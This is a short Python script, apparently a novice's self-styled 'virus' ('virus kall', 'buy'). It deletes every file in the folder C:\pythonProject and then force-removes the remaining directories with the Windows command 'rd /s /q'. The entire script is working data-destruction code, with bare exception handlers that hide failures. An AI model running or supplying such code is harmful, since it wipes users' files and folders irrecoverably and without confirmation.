import os
f = os.listdir(path = "C:\pythonProject")
os.chdir("C:\pythonProject")
for i in f:
    try:
        print(i)
        os.remove(i)
    except:
        try:
            os.system('rd /s /q' + '"' + i + '"')
        except:
            print("virus kall")
print("buy")
